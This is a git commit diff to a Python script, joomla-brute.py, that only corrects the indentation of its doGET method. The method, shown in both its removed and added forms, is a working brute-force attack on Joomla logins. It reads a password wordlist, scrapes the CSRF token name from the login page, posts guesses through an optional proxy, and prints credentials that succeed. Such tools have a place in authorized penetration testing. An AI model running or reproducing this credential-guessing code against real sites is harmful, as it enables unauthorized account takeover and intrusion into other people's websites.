f1dbcbf1f1ef3a843e118709611b06afea9ee68e
Martin Barker <84631290+mdb-dev-io@users.noreply.github.com>
2024-02-29 07:45:27 +0000

    Update joomla-brute.py

--- joomla-brute.py
+++ joomla-brute.py
@@ -73,45 +73,45 @@ class Joomla():
         else:
             self.doGET()
 
-def doGET(self):
-    passwords = self.getdata(self.wordlistfile)  # Load all passwords
-    total_passwords = len(passwords)  # Total number of passwords
-    current_password_index = 1  # Initialize password index
-
-    for password in passwords:
-        # Dynamically update the progress message in one line
-        sys.stdout.write(f'\rtrying password {current_password_index} of {total_passwords}: {password.decode("utf-8")}')
-        sys.stdout.flush()  # Ensure the line is updated immediately
-
-        # Custom user-agent
-        headers = {'User-Agent': 'nano'}
-
-        # First GET for CSSRF
-        r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies, headers=headers)
-        soup = BeautifulSoup(r.text, 'html.parser')
-        longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
-        password = password.decode('utf-8')
-
-        data = {
-            'username': self.username,
-            'passwd': password,
-            'option': self.option,
-            'task': self.task,
-            'return': self.ret,
-            longstring: 1
-        }
-
-        r = requests.post(self.url, data=data, proxies=self.proxy, cookies=self.cookies, headers=headers)
-        soup = BeautifulSoup(r.text, 'html.parser')
-        response = soup.find('div', {'class': 'alert-message'})
-        
-        if response and self.verbose:
-            print(f'\n{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')  # Move to a new line for failed attempts
-        elif not response:
-            print(f'\n{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')  # Move to a new line for successful attempts
-            break
-        
-        current_password_index += 1  # Increment the password index
+    def doGET(self):
+        passwords = self.getdata(self.wordlistfile)  # Load all passwords
+        total_passwords = len(passwords)  # Total number of passwords
+        current_password_index = 1  # Initialize password index
+    
+        for password in passwords:
+            # Dynamically update the progress message in one line
+            sys.stdout.write(f'\rtrying password {current_password_index} of {total_passwords}: {password.decode("utf-8")}')
+            sys.stdout.flush()  # Ensure the line is updated immediately
+    
+            # Custom user-agent
+            headers = {'User-Agent': 'nano'}
+    
+            # First GET for CSSRF
+            r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies, headers=headers)
+            soup = BeautifulSoup(r.text, 'html.parser')
+            longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
+            password = password.decode('utf-8')
+    
+            data = {
+                'username': self.username,
+                'passwd': password,
+                'option': self.option,
+                'task': self.task,
+                'return': self.ret,
+                longstring: 1
+               }
+    
+            r = requests.post(self.url, data=data, proxies=self.proxy, cookies=self.cookies, headers=headers)
+            soup = BeautifulSoup(r.text, 'html.parser')
+            response = soup.find('div', {'class': 'alert-message'})
+            
+            if response and self.verbose:
+                print(f'\n{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')  # Move to a new line for failed attempts
+            elif not response:
+                print(f'\n{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')  # Move to a new line for successful attempts
+                break
+            
+            current_password_index += 1  # Increment the password index
 
 
     @staticmethod
@@ -123,3 +123,4 @@ def doGET(self):
 
 
 joomla = Joomla()
+
